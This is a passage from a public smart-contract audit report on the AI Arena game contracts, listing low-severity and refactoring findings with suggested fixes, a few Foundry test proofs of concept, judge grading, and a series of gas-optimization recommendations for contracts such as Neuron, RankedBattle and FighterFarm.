1. `_delegatedAddress` is being set only once, in the constructor, and there is no check if its `address(0)`. In the off-chance of this value being misconfigured any signature would be able to mint a fighter.
2. In the event of a security breach on the backend, there is no way to change the `_delegatedAddress`. This means a hacker could mint as many and whatever kind of fighter they would like.

**Suggested mitigation**
- Add require check in `FighterFarm`'s constructor
```diff
+ require(_delegatedAddress != address(0), "Invalid delegated address");
```
- Add  `setDelegatedAddress(address) external` function, which should be callable only by the owner, similar to the already existing `setMergingPoolAddress(address)`.

## [02] Missing functions to change the treasury in various contracts

The `treasuryAddress` receives an initial mint of NRN and subsequently smaller transfers of the currency. 

In the situation of a security breach, protocol ownership change or some other unforeseen events it could be troublesome that the treasury address can't change. A fallback mechanism is necessary, just like one exists for changing the **owner**.

**Suggested mitigation**
Either add `setTreasury(address)` function, callable only by the owner, in the following contracts:
- `FighterFarm.sol`
- `GameItems.sol`
- `Neuron.sol`
- `StakeAtRisk.sol` 

Or make all of them reference the treasury from the `Neuron` contract, since they all have a reference to it, and have `setTreasury(address)` only in `Neuron.sol`.

## [03] Missing checks for game item invariants when calling `createGameItem`

It is possible for an item to have infinite supply (`finiteSupply == false`) and have `itemsRemaining > 0`.

Add:
```sol
if(finiteSupply && itemsRemaining > 0) {
  revert("Conflicting item parameters");
}
```

## [04] There are no functions for adjusting `GameItemAttributes` 

In the event of misconfigured item, promotions/discounts, balance adjustments a new item with the same name needs to be created. Adding function to update parameter/s is going to make resolution of such situations straight-forward.

## [05] `getFighterPoints` view function is unusable 

The `getFighterPoints` function is created as a helper, to produce a list of the fighters' points. The issue with it is that it allocates the resulting array with only 1 item. This makes it impossible to use for any practical purposes, because client code would be interested in more fighters than the first one.

Another concern with the function is that it could become impossible to use if enough fighters are created. A big enough array would DoS the function. Consider providing it with a range of indices.

In this way you would limit the return data.

**PoC**
```sol
function testIndexOOB() public {
  address user1 = makeAddr("user1");
  address user2 = makeAddr("user2");
  _mintFromMergingPool(_ownerAddress);
  _mintFromMergingPool(user1);
  _mintFromMergingPool(user2);

  vm.startPrank(address(_rankedBattleContract));
  _mergingPoolContract.addPoints(0, 100);
  _mergingPoolContract.addPoints(1, 100);
  _mergingPoolContract.addPoints(2, 100);
  assertEq(_mergingPoolContract.totalPoints(), 300);
  vm.stopPrank();
  
  // fighter points contains values for 3 fighters, but when we ask for 2 or 3, it fails
  vm.expectRevert(stdError.indexOOBError);
  uint256[] memory fighterPoints = _mergingPoolContract.getFighterPoints(2);
  assertEq(fighterPoints.length, 2);
}
```

## [06] Misleading function names in `FighterFarm.sol`

The following functions should be renamed:
`instantiateAIArenaHelperContract` to `setAIArenaHelperContract`
`instantiateMintpassContract` to `setMintpassContract`
`instantiateNeuronContract` to `setNeuronContract`

Since they are not actually instantiating anything, `set` would be a more appropriate prefix. Just like it is done in `setMergingPoolAddress` and `setTokenURI`.

## [07] Extract constant for custom attributes in `FighterFarm.sol`

As mentioned by the developers the value 100 is used for custom attributes:
> guppy — 02/11/2024 3:50 PM
   100 is a flag we use to determine if it’s a custom attribute or not

To avoid sprinkling literals in the codebase and improve it's readability it is recommended to extract this literal to a constant, something like this:
```sol
/// @notice Special value for custom attributes
uint256 private constant CUSTOM_ATTRIBUTE = 100
```

And replacing it in the following lines: [here](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L219), [here](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L259) and [here](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L499).

## [08] Rename `dendroidBool` to `isDendroid`

Variable containing its type is redundant in statically typed languages. `is` prefix is common convention for boolean values.

Alternatively, replace the value with `uint8 fighterType`.

## [09] Fix misleading function name and natspec in `GameItems.sol`

The function `instantiateNeuronContract` should be renamed to `setNeuronContract`, because it conveys what the function actually does.

Additionally, update the comment, to be more accurate:
```diff
- /// @notice Sets the Neuron contract address and instantiates the contract.
+ /// @notice Sets the Neuron contract address.
```

## [10] Send zero bytes as data argument when minting 

It's unusual to have an arbitrary string as the data parameter of the `_mint` function. Replace `bytes("random")` with `"0x"`

## [11] Missing notice tag in natspec for variables in `MergingPool.sol`

```diff
- /// The address that has owner privileges (initially the contract deployer).
+ /// @notice The address that has owner privileges (initially the contract deployer).
address _ownerAddress;

- /// The address of the ranked battle contract.
+ /// @notice The address of the ranked battle contract.
address _rankedBattleAddress;
```

> Default tag is @notice, but it's nice to be consistent with the other natspecs.

## [12] Incorrect doc string for variable in `MergingPool.sol`

```diff
- /// @notice Mapping of address to fighter points.
+ /// @notice Mapping of fighterId to fighter points.
mapping(uint256 => uint256) public fighterPoints;
```

## [13] Common setup code in tests can be extracted to a base class

Currently, there is a lot of duplicated setup code and variables in the tests. See the setup of:
- `AiArenaHelper.t.sol`
- `FighterFarm.t.sol`
- `MergingPool.t.sol`
- `RankedBattle.t.sol`
- `StakeAtRisk.t.sol`
- `VoltageManager.t.sol`

This can be avoided by creating a Base contract that contains common setup and then each Test contract will do only its own specific configuration.

## [14] Misleading function names in `RankedBattle.sol`

Rename `instantiateNeuronContract` to `setNeuronContract`, to reflect what the function is actually doing.
Update the natspec:
```diff
- /// @notice Instantiates the neuron contract.
+ /// @notice Sets the neuron contract.
```

Rename `instantiateMergingPoolContract` to `setMergingPoolContract`, to reflect what the function is actually doing.
Update the natspec:
```diff
- /// @notice Instantiates the merging pool contract.
+ /// @notice Sets the merging pool contract.
```

Rename `setNewRound()` to `beginNewRound()`. As prefix set implies the caller will specify a roundId, which is not the case. The function actually increments the roundId.

## [15] Improvements to `updateBattleRecord` function

Create a `BattleResult` enum and use it instead of `uint8`. This will improve the code readability. It will be easy to understand if we're looking in the case of a `win` and additional comments like `/// If the user won the match` will become unnecessary, as the code will be self-documenting.

```diff
+ enum BattleResult {
+   win,
+   tie,
+   loss
+ }

function updateBattleRecord(
  ...
- uint8 battleResult,
+ BattleResult battleResult,
  ...
)
```

Rename `updateBattleRecord` parameter:
```diff
function updateBattleRecord(
  ...
- bool initiatorBool,
+ bool isInitiator,
  ...
)
```
It will convey better the purpose of the variable.

## [16] Simplify assert statements

Some assert statements are being unnecessarily complicated, there are overloads that support all cases for comparison of native types. Using the correct APIs increases the readability and expressiveness of code. There are many instances where assert calls can be improved, below I have outlined some general examples.

In the following lines, the `==` operator can be omitted:
```diff
- assertEq(_mergingPoolContract.winnerAddresses(0, 0) == _ownerAddress, true);
+ assertEq(_mergingPoolContract.winnerAddresses(0, 0), _ownerAddress);

- assertEq(mintPass.totalSupply() == mintPass.numTokensOutstanding(), true);
+ assertEq(mintPass.totalSupply(), mintPass.numTokensOutstanding());

```

Here a specialised assert can be used:
```diff
- assertEq(mintPass.mintingPaused(), true);
+ assertTrue(mintPass.mintingPaused());
```

> See `forge-std/lib/ds-test/src/test.sol` for all assert overloads.

Avoid using the Solidity native assert statement, when you can use the APIs from Forge:
```diff
- assert(_helperContract.attributeToDnaDivisor("head") != 99);
+ assertNotEq(_helperContract.attributeToDnaDivisor("head"), 99);
```

## [17] Consider replacing decimal multiplier with `ether` keyword

Since ether contains 18 decimals it is possible to use the `ether` keyword when describing NRN values. It is shorter and conveys the amount just as well.

Example:
```diff
- uint256 stakeAmount = 3_000 * 10 ** 18;
+ uint256 stakeAmount = 3_000 ether;
```

A simple string replace will update all instances correctly, with the exception of 1, which is easy to do manually.

## [18] Players lose their current voltage when using a battery

*Note: At the judge’s request [here](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1695#issuecomment-1978456865), this downgraded issue from the same warden has been included in this report for completeness.*

https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/VoltageManager.sol#L93-L99

When players deplete their voltage through battles, they have the option to replenish it using a **voltage battery**. Although the maximum voltage capacity is 100, and each battle reduces it by 10, the `useVoltageBattery()` function resets the voltage to 100, disregarding any remaining voltage a player has.

```sol
ownerVoltage[msg.sender] = 100;
```

From a design point of view it looks good to have the number 100 as max and 0 as min value for voltage. But in this situation it is doing players a disservice.

### Root cause 

The core issue arises from the function overwriting the existing voltage value instead of incrementally adding to it.

### Impact

**Voltage batteries**, as valuable **paid** items, enable more frequent participation in ranking matches. However, players risk losing up to 90% of their replenished voltage due to the current implementation, leading to potential losses in NRN (the game's currency).

### Scenario

Should a player replenish their voltage without checking their current level, they risk using a battery without receiving its full value, thereby not maximizing the item's cost-effectiveness.

### Proof of Concept

In `VoltageManager.t.sol`:
```sol
function testLoseVoltageFromBattery() public {
  address player = _ownerAddress;
  uint8 voltageSpendAmount = 10;
  _mintGameItemForReceiver(player);
  uint256 currentVoltage = _voltageManagerContract.ownerVoltage(player);
  assertEq(currentVoltage, 0);

  // battery gives full 100 voltage
  _voltageManagerContract.useVoltageBattery();
  _voltageManagerContract.spendVoltage(player, voltageSpendAmount);
  assertEq(_voltageManagerContract.ownerVoltage(player), 100 - voltageSpendAmount); // 10 voltage just spent

  // Call use battery again, for whatever reason
  _voltageManagerContract.useVoltageBattery();
  // battery gave only 10 voltage
  assertEq(_voltageManagerContract.ownerVoltage(player), 100);
}
```

### Suggested Mitigation
Modify the function to add the voltage battery's value to the existing voltage, rather than resetting it:
```diff
function useVoltageBattery() public {
...
- ownerVoltage[msg.sender] = 100;
+ ownerVoltage[msg.sender] += 100;
...
}
```

**[hickuphh3 (judge) commented](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1695#issuecomment-1978456865):**
> **01**: Good, refactor (explained the impact)
> **02:** Refactor
> **03:** Refactor
> **04:** Refactor
> **05:** Low
> **06:** Refactor
> **07:** Non-critical
> **08:** Refactor
> **09/14:** Refactor/Non-critical
> **10:** Refactor
> **11/12:** Low/Refactor
> **13:** Refactor/Non-critical
> **15:** Refactor
> **16:** Non-critical
> **17:** Non-critical
> **18:** Low
> 
> Overall very good and targeted recommendations, found them rather meaningful.

**[brandinho (AI Arena) acknowledged](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1695#issuecomment-2018920154)**



***

# Gas Optimizations

For this audit, 36 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1798) by **0xDetermination** received the top score from the judge.

*The following wardens also submitted reports: [0x11singh99](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1036), [K42](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/346), [mikesans](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2032), [hunter\_w3b](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2017), [SY\_S](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/2008), [SAQ](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1935), [SM3\_SS](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1928), [PetarTolev](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1875), [shamsulhaq123](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1865), [donkicha](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1840), [favelanky](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1836), [dharma09](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1808), [rekxor](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1805), [unique](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1740), [MatricksDeCoder](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1514), [McToady](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1354), [Raihan](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1341), [yashgoel72](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1279), [yovchev\_yoan](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1201), [ahmedaghadi](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1198), [lrivo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1187), [0xAnah](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1184), [al88nsk](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1138), [merlinboii](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1098), [offside0011](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1038), [lsaudit](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/910), [peter](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/883), [emrekocak](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/835), [oualidpro](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/700), [ziyou-](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/451), [Timenov](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/265), [judeabara](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/227), [0xRiO](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/211), [kiqo](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/81), and [JcFichtner](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/57).*

## Summary

|Issue number|Description|
|:-|:-|
|[G-01]|`Neuron.claim()` allowance check is not necessary because `transferFrom()` also checks allowance|
|[G-02]|`Neuron.claim()` can call code in `transferFrom()` implementation directly instead of calling `transferFrom()`|
|[G-03]|`Neuron.burnFrom()` allowance check is not necessary|
|[G-04]|`RankedBattle._getStakingFactor()` accesses the same storage variable a second time whenever it's called (in `stakeNRN()`, `unstakeNRN()`, and `updateBattleRecord()`)|
|[G-05]|NRN `success` checks are unnecessary because the OZ implementation will not fail without reverting|
|[G-06]|`RankedBattle.claimNRN()` is gas inefficient for addresses that don't have any points in previous rounds|
|[G-07]|`RankedBattle.updateBattleRecord()` doesn't need to check voltage since `VoltageManager.spendVoltage()` will revert if voltage is too low|
|[G-08]|`RankedBattle._addResultPoints()` can put code inside an existing conditional statement to avoid incrementing storage variables by zero|
|[G-09]|`RankedBattle._addResultPoints()` executes unnecessary lines of code in case of a tie|
|[G-10]|Unnecessary equality comparison in `RankedBattle._updateRecord()`|
|[G-11]|`FighterFarm.sol` inherits `ERC721Enumerable` but the codebase doesn't use any of the enumerable methods|
|[G-12]|Balance check in `FighterFarm.reRoll()` is not necessary since `transferFrom()` will revert in case of insufficient balance|
|[G-13]|`FighterFarm._beforeTokenTransfer()` can be deleted to save an extra function call|
|[G-14]|`FighterFarm._createFighterBase()` performs unnecessary check when minting dendroid|
|[G-15]|`MergingPool.claimRewards()` should update `numRoundsClaimed` after the loop ends instead of incrementing it in every loop|
|[G-16]|`MergingPool.pickWinner()` and `MergingPool.claimRewards()` can be refactored so that users don't have to iterate through the entire array of winners for every round|
|[G-17]|DNA rarity calculation in `AiArenaHelper.dnaToIndex()` can be redesigned to save gas|
|[G-18]|`AiArenaHelper.createPhysicalAttributes()` should check for `iconsType` before running icons-relevant code since icons fighters are rare|
|[G-19]|`AiArenaHelper` constructor sets probabilities twice|

## [G-01]`Neuron.claim()` allowance check is not necessary because `transferFrom()` also checks allowance

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/Neuron.sol#L139-L142

### Description

The require statement below can be removed since `transferFrom()` will check/update the allowance.
```solidity
    function claim(uint256 amount) external {
        require(
            allowance(treasuryAddress, msg.sender) >= amount, 
            "ERC20: claim amount exceeds allowance"
        );
        transferFrom(treasuryAddress, msg.sender, amount);
        emit TokensClaimed(msg.sender, amount);
    }
```

### Recommended Fix

Delete the require statement.

## [G-02] `Neuron.claim()` can call code in `transferFrom()` implementation directly instead of calling `transferFrom()`

### Links

https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.9/contracts/token/ERC20/ERC20.sol#L158-L163<br>
https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/Neuron.sol#L143

### Description

See the OZ `transferFrom()` implementation:
```solidity
    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
```
`Neuron.claim()` can run the above code directly without spending extra gas for the function call and to cache `msg.sender`.

### Recommended Fix

```diff
    function claim(uint256 amount) external {
        require(
            allowance(treasuryAddress, msg.sender) >= amount, 
            "ERC20: claim amount exceeds allowance"
        );
-       transferFrom(treasuryAddress, msg.sender, amount);
+       _spendAllowance(treasuryAddress, msg.sender, amount);
+       _transfer(treasuryAddress, msg.sender, amount);
        emit TokensClaimed(msg.sender, amount);
    }
```

## [G-03] `Neuron.burnFrom()` allowance check is not necessary

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/Neuron.sol#L196-L204

### Description

Note below that if the amount exceeds the allowance, the `decreasedAllowance` calculation will underflow and cause a revert. The `require` allowance check can be removed.
```solidity
    function burnFrom(address account, uint256 amount) public virtual {
        require(
            allowance(account, msg.sender) >= amount, 
            "ERC20: burn amount exceeds allowance"
        );
        uint256 decreasedAllowance = allowance(account, msg.sender) - amount;
        _burn(account, amount);
        _approve(account, msg.sender, decreasedAllowance);
    }
```
### Recommended Fix

Remove the require statement.

## [G-04] `RankedBattle._getStakingFactor()` accesses the same storage variable a second time whenever it's called (in `stakeNRN()`, `unstakeNRN()`, and `updateBattleRecord()`)

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L528<br>
https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L253-L258<br>
https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L272-L277<br>
https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L342

### Description

`RankedBattle._getStakingFactor()` accesses the storage variable `amountStaked[tokenId]` after the three mentioned functions access the same variable (see links). This variable should be cached to decrease storage reads and gas costs.

### Recommended Fix

Cache `amountStaked[tokenId]` and pass it to `_getStakingFactor()`.

## [G-05] NRN `success` checks are unnecessary because the OZ implementation will not fail without reverting

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L284

### Description

The pattern in the link provided (checking for NRN transfer success) is used widely in the codebase, but these checks are unnecessary since transfers won't fail without reverting.

### Recommended Fix

Remove the NRN `success` checks.

## [G-06] `RankedBattle.claimNRN()` is gas inefficient for addresses that don't have any points in previous rounds

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L294-L311

### Description

The for loop in `claimNRN()` will start at zero for new users and spend thousands of gas accessing/setting storage in each loop, although the user will not have any rewards in earlier rounds.

```solidity
    function claimNRN() external {
        require(numRoundsClaimed[msg.sender] < roundId, "Already claimed NRNs for this period");
        uint256 claimableNRN = 0;
        uint256 nrnDistribution;
        uint32 lowerBound = numRoundsClaimed[msg.sender];
        for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {
            nrnDistribution = getNrnDistribution(currentRound);
            claimableNRN += (
                accumulatedPointsPerAddress[msg.sender][currentRound] * nrnDistribution   
            ) / totalAccumulatedPoints[currentRound];
            numRoundsClaimed[msg.sender] += 1;
        }
```
### Recommended Fix

Allow users to set their `numRoundsClaimed` to an arbitrary value.

## [G-07] `RankedBattle.updateBattleRecord()` doesn't need to check voltage since `VoltageManager.spendVoltage()` will revert if voltage is too low

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L334-L338<br>
https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/VoltageManager.sol#L110

### Description

`updateBattleRecord()` checks that the initiator's voltage is sufficient:
```solidity
        require(
            !initiatorBool ||
            _voltageManagerInstance.ownerVoltageReplenishTime(fighterOwner) <= block.timestamp || 
            _voltageManagerInstance.ownerVoltage(fighterOwner) >= VOLTAGE_COST
        );
```
This check is not necessary, since `VoltageManager.spendVoltage()` will revert if the voltage is too low:
```solidity
    function spendVoltage(address spender, uint8 voltageSpent) public {
        require(spender == msg.sender || allowedVoltageSpenders[msg.sender]);
        if (ownerVoltageReplenishTime[spender] <= block.timestamp) {
            _replenishVoltage(spender);
        }
        ownerVoltage[spender] -= voltageSpent; // UNDERFLOWS AND REVERTS IF VOLTAGE IS TOO LOW
        emit VoltageRemaining(spender, ownerVoltage[spender]);
    }
```
Note that this check can also be performed offchain before calling `updateBattleRecord()`.

### Recommended Fix

Remove the require statement.

## [G-08] `RankedBattle._addResultPoints()` can put code inside an existing conditional statement to avoid incrementing storage variables by zero

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L466-L471

### Description

See the following code from the `RankedBattle._addResultPoints()` below. The `points` variable can be zero, such as if the player's `mergingFactor` is 100. The lines updating storage variables with `points` should be put inside the `if` block.

```solidity
            accumulatedPointsPerFighter[tokenId][roundId] += points;
            accumulatedPointsPerAddress[fighterOwner][roundId] += points;
            totalAccumulatedPoints[roundId] += points;
            if (points > 0) {
                emit PointsChanged(tokenId, points, true);
            }
```

### Recommended Fix

```diff
-           accumulatedPointsPerFighter[tokenId][roundId] += points;
-           accumulatedPointsPerAddress[fighterOwner][roundId] += points;
-           totalAccumulatedPoints[roundId] += points;
            if (points > 0) {
+               accumulatedPointsPerFighter[tokenId][roundId] += points;
+               accumulatedPointsPerAddress[fighterOwner][roundId] += points;
+               totalAccumulatedPoints[roundId] += points;
                emit PointsChanged(tokenId, points, true);
            }
```

## [G-09] `RankedBattle._addResultPoints()` executes unnecessary lines of code in case of a tie

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L425-L439

### Description

`RankedBattle._addResultPoints()` runs all of the below code in case of a tie; it's all setup for the win/lose code blocks, which make up the rest of the function. There's no more code that runs in case of a tie. The only state modification in this function in case of a tie is updating the stakingFactor if it was not already updated, but since points/stake does not change in case of a tie the update is not necessary.
```solidity
        uint256 stakeAtRisk;
        uint256 curStakeAtRisk;
        uint256 points = 0;

        /// Check how many NRNs the fighter has at risk
        stakeAtRisk = _stakeAtRiskInstance.getStakeAtRisk(tokenId);

        /// Calculate the staking factor if it has not already been calculated for this round 
        if (_calculatedStakingFactor[tokenId][roundId] == false) {
            stakingFactor[tokenId] = _getStakingFactor(tokenId, stakeAtRisk);
            _calculatedStakingFactor[tokenId][roundId] = true;
        }

        /// Potential amount of NRNs to put at risk or retrieve from the stake-at-risk contract
        curStakeAtRisk = (bpsLostPerLoss * (amountStaked[tokenId] + stakeAtRisk)) / 10**4;
        // THE REST OF THE CODE IN THIS FUNCTION ONLY RUNS IN CASE OF A WIN OR LOSS
```
### Recommended Fix

Cut the code above and paste it at the top of both the win and lose blocks.

## [G-10] Unnecessary equality comparison in `RankedBattle._updateRecord()`

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/RankedBattle.sol#L505-L513

### Description

There are only three cases for `battleResult`, so below it's not necessary to check the result 3 times. An `else` block can replace the second `else if` block.
```solidity
    function _updateRecord(uint256 tokenId, uint8 battleResult) private {
        if (battleResult == 0) {
            fighterBattleRecord[tokenId].wins += 1;
        } else if (battleResult == 1) {
            fighterBattleRecord[tokenId].ties += 1;
        } else if (battleResult == 2) {
            fighterBattleRecord[tokenId].loses += 1;
        }
    }
```

### Recommended Fix

```diff
-       } else if (battleResult == 2) {
+       } else {
```

## [G-11] `FighterFarm.sol` inherits `ERC721Enumerable` but the codebase doesn't use any of the enumerable methods

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L16

### Description

Solely inheriting `ERC721` in the `FighterFarm` contract would save on deployment costs since the codebase doesn't use the enumerable methods.

### Recommended Fix

If desired, don't inherit from `ERC721Enumerable`.

## [G-12] Balance check in `FighterFarm.reRoll()` is not necessary since `transferFrom()` will revert in case of insufficient balance

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L373

### Description

In the function below, the balance require check is not necessary due to `transferFrom()` implementation.
```solidity
    function reRoll(uint8 tokenId, uint8 fighterType) public {
        require(msg.sender == ownerOf(tokenId));
        require(numRerolls[tokenId] < maxRerollsAllowed[fighterType]);
        require(_neuronInstance.balanceOf(msg.sender) >= rerollCost, "Not enough NRN for reroll"); //Can delete

        _neuronInstance.approveSpender(msg.sender, rerollCost);
        bool success = _neuronInstance.transferFrom(msg.sender, treasuryAddress, rerollCost); //Will revert if balance is insufficient
```

### Recommended Fix

Delete the `balanceOf()` require check.

## [G-13] `FighterFarm._beforeTokenTransfer()` can be deleted to save an extra function call

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L451<br>
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.9/contracts/token/ERC721/extensions/ERC721Enumerable.sol#L60

### Description

Note the code below:
```solidity
contract FighterFarm is ERC721, ERC721Enumerable {
    ...
    function _beforeTokenTransfer(address from, address to, uint256 tokenId)
        internal
        override(ERC721, ERC721Enumerable)
    {
        super._beforeTokenTransfer(from, to, tokenId);
    }
```
Inheritance in solidity is right-to-left and `super._beforeTokenTransfer(from, to, tokenId);` will call the `_beforeTokenTransfer()` method in `ERC721Enumerable`. Therefore, this function can be deleted and the functionality will be the same while eliminating an extra function call and saving gas.

### Recommended Fix

Remove `FighterFarm._beforeTokenTransfer()`.

## [G-14] `FighterFarm._createFighterBase()` performs unnecessary check when minting dendroid

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L484-L531<br>
https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/FighterFarm.sol#L462-L474<br>
https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L83-L94

### Description

Notice below that `_createNewFighter()` only uses `newDna` when calling `AiArenaHelper.createPhysicalAttributes()`:
```solidity
    function _createNewFighter(
        ...
        uint256 element; 
        uint256 weight;
        uint256 newDna;
        if (customAttributes[0] == 100) {
            (element, weight, newDna) = _createFighterBase(dna, fighterType);
        }
        else {
            element = customAttributes[0];
            weight = customAttributes[1];
            newDna = dna;
        }
        uint256 newId = fighters.length;

        bool dendroidBool = fighterType == 1;
        FighterOps.FighterPhysicalAttributes memory attrs = _aiArenaHelperInstance.createPhysicalAttributes(
            newDna,
            generation[fighterType],
            iconsType,
            dendroidBool
        );
        //newDna is not used after this point
    ...
    function _createFighterBase(
        uint256 dna, 
        uint8 fighterType
    ) 
        private 
        view 
        returns (uint256, uint256, uint256) 
    {
        uint256 element = dna % numElements[generation[fighterType]];
        uint256 weight = dna % 31 + 65;
        uint256 newDna = fighterType == 0 ? dna : uint256(fighterType); //This check is not needed
        return (element, weight, newDna);
    }
```

The above check in `_createFighterBase()` that sets dendroid fighters' (`fighterType` equals 1) `newDna` to a different value is not necessary, because `newDna` will not be used in `AiArenaHelper.createPhysicalAttributes()` when creating a dendroid and there are only two fighter types:
```solidity
    function createPhysicalAttributes(
        uint256 dna, 
        uint8 generation, 
        uint8 iconsType, 
        bool dendroidBool
    ) 
        external 
        view 
        returns (FighterOps.FighterPhysicalAttributes memory) 
    {
        if (dendroidBool) {
            return FighterOps.FighterPhysicalAttributes(99, 99, 99, 99, 99, 99);
```

### Recommended Fix

Instances of `newDna` can be removed and `dna` used instead, since `dna` will not change for non-dendroid fighters and `newDna` is not used when creating a dendroid fighter. 

## [G-15] `MergingPool.claimRewards()` should update `numRoundsClaimed` after the loop ends instead of incrementing it in every loop

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/MergingPool.sol#L150

### Description

The below code is not gas efficient due to SSTORE/SLOAD of the `numRoundsClaimed` state variable in every loop.

```solidity
    function claimRewards(
        string[] calldata modelURIs, 
        string[] calldata modelTypes,
        uint256[2][] calldata customAttributes
    ) 
        external 
    {
        uint256 winnersLength;
        uint32 claimIndex = 0;
        uint32 lowerBound = numRoundsClaimed[msg.sender];
        for (uint32 currentRound = lowerBound; currentRound < roundId; currentRound++) {
            numRoundsClaimed[msg.sender] += 1;
```

### Recommended Fix

Instead of incrementing the state variable in every loop, increment a local variable and then update the state variable after the loop ends.

## [G-16] `MergingPool.pickWinner()` and `MergingPool.claimRewards()` can be refactored so that users don't have to iterate through the entire array of winners for every round

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/MergingPool.sol#L151-L153

### Description

Notice how `claimRewards()` detects if the caller has rewards to claim in a round:
```solidity
            winnersLength = winnerAddresses[currentRound].length;
            for (uint32 j = 0; j < winnersLength; j++) {
                if (msg.sender == winnerAddresses[currentRound][j]) {
```
This method is very gas inefficient since `winnerAddresses` is in storage.

### Recommended Fix

Instead of iterating through all the winner addresses in every round, `MergingPool.pickWinner()` and `MergingPool.claimRewards()` could be refactored to increment a new state variable tracking number of rewards (per round, if desired).

## [G-17] DNA rarity calculation in `AiArenaHelper.dnaToIndex()` can be redesigned to save gas

### Links

https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L108<br>
https://github.com/code-423n4/2024-02-ai-arena/blob/main/src/AiArenaHelper.sol#L169-L186

### Description

`dnaToIndex()` is called inside a loop for all the fighter physical properties (see first link), which consumes a lot of gas due to storage loads. The system of calculating `attributeProbabilityIndex` by looping through the probabilities and comparing the `cumProb` to `rarityRank` could be refactored to retain the same functionality but save a lot of gas.

`dnaToIndex()` function below for reader convenience:
```solidity
    function dnaToIndex(uint256 generation, uint256 rarityRank, string memory attribute) 
        public 
        view 
        returns (uint256 attributeProbabilityIndex) 
    {
        uint8[] memory attrProbabilities = getAttributeProbabilities(generation, attribute);
        
        uint256 cumProb = 0;
        uint256 attrProbabilitiesLength = attrProbabilities.length;
        for (uint8 i = 0; i < attrProbabilitiesLength; i++) {
            cumProb += attrProbabilities[i];
            if (cumProb >= rarityRank) {
                attributeProbabilityIndex = i + 1;
                break;
            }
        }
        return attributeProbabilityIndex;
    }
```

### Recommended Fix

Refactor attribute index/rarity calculation.

